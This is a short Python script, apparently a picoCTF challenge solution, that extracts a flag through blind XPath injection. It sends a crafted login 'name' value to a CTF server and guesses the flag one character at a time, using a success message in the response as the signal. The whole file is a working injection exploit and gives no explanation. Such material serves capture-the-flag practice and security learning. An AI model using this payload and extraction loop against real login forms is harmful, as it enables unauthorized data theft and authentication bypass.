import requests
import string

url = "http://wily-courier.picoctf.net:63849/"
result = "picoCTF{"
trys = string.printable

while True:
    flag = False
    for t in trys:
        payload = f"' or contains(.,'{result + t}') or 'x' = 'x"
        r = requests.post(url , data = {"name" : payload , "pass" : "aaa"})
        if "on the right path." in r.text:
            result += t
            print("now flag =>" , result)
            flag = True
            if t == '}':
                print("final flag => " , result)
                exit()
            break
    if not flag:
        print("NNNNNNNoooooooo......")
        break
